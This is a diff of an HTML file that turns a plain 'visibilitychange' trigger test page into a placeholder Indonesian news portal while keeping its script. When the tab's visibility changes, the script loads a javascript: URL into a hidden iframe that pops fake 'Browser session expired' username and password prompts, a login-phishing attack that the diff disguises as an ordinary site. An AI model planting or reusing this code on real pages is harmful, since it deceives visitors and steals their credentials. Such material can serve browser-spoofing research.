@@ -1,18 +1,144 @@
 <!DOCTYPE html>
-<html lang="en-US">
+<html lang="id">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, user-scalable=no">
-<title>visibilitychange UI Trigger</title>
+    <meta charset="UTF-8">
+    <title>Portal Berita</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, Helvetica, sans-serif;
+            background-color: #f4f4f4;
+            color: #333;
+        }
 
-<style>
-  iframe {
-    visibility: hidden;
-    width: 0;
-    height: 0;
-  }
-</style>
+        header {
+            background-color: #1e88e5;
+            color: white;
+            padding: 20px;
+            text-align: center;
+        }
 
+        nav {
+            background-color: #1565c0;
+            padding: 10px;
+            text-align: center;
+        }
+
+        nav a {
+            color: white;
+            margin: 0 15px;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        nav a:hover {
+            text-decoration: underline;
+        }
+
+        .container {
+            width: 90%;
+            max-width: 1100px;
+            margin: 20px auto;
+            display: grid;
+            grid-template-columns: 3fr 1fr;
+            gap: 20px;
+        }
+
+        .article {
+            background: white;
+            padding: 20px;
+            margin-bottom: 20px;
+            border-radius: 5px;
+        }
+
+        .article h2 {
+            margin-top: 0;
+        }
+
+        .article small {
+            color: #777;
+        }
+
+        .sidebar {
+            background: white;
+            padding: 20px;
+            border-radius: 5px;
+            height: fit-content;
+        }
+
+        footer {
+            background-color: #1e88e5;
+            color: white;
+            text-align: center;
+            padding: 15px;
+            margin-top: 20px;
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+
+<header>
+    <h1>Portal Berita</h1>
+    <p>Berita Terbaru & Terpercaya</p>
+</header>
+
+<nav>
+    <a href="#">Home</a>
+    <a href="#">Nasional</a>
+    <a href="#">Teknologi</a>
+    <a href="#">Olahraga</a>
+    <a href="#">Kontak</a>
+</nav>
+
+<div class="container">
+    <!-- Konten Utama -->
+    <div>
+        <div class="article">
+            <h2>Judul Berita Pertama</h2>
+            <small>12 Januari 2026 | Admin</small>
+            <p>
+                Ini adalah contoh ringkasan berita. Anda bisa menuliskan
+                isi artikel atau potongan berita terbaru di sini.
+            </p>
+        </div>
+
+        <div class="article">
+            <h2>Judul Berita Kedua</h2>
+            <small>11 Januari 2026 | Redaksi</small>
+            <p>
+                Landing page ini cocok untuk blog pribadi atau portal berita
+                sederhana menggunakan HTML dan CSS.
+            </p>
+        </div>
+
+        <div class="article">
+            <h2>Judul Berita Ketiga</h2>
+            <small>10 Januari 2026 | Editor</small>
+            <p>
+                Desain responsif dan mudah dikembangkan ke CMS atau framework
+                seperti Laravel atau React.
+            </p>
+        </div>
+    </div>
+
+    <!-- Sidebar -->
+    <aside class="sidebar">
+        <h3>Berita Populer</h3>
+        <ul>
+            <li><a href="#">Berita Politik Hari Ini</a></li>
+            <li><a href="#">Teknologi AI Terbaru</a></li>
+            <li><a href="#">Hasil Pertandingan</a></li>
+            <li><a href="#">Ekonomi Nasional</a></li>
+        </ul>
+    </aside>
+</div>
 <script>
 let armed = false;
 
@@ -30,7 +156,7 @@ document.addEventListener("visibilitychange", function () {
     const iframe = document.getElementById("iframe");
     iframe.src =
 "javascript:(function(){\
-          var u = prompt('Opera News session expired.\\nPlease sign in again to continue.\\nUsername:');\
+          var u = prompt('Browser session expired.\\nPlease sign in again to continue.\\nUsername:');\
           if(u === null) return;\
           var p = prompt('Password:');\
           if(p === null) return;\
@@ -39,14 +165,11 @@ document.addEventListener("visibilitychange", function () {
   }
 });
 </script>
-</head>
-
-<body>
-<center>
-  <br>
-  <h1>VisibilityChange Trigger Test</h1>
-</center>
-
 <iframe id="iframe"></iframe>
+
+<footer>
+    <p>&copy; 2026 Portal Berita. All rights reserved.</p>
+</footer>
+
 </body>
 </html>
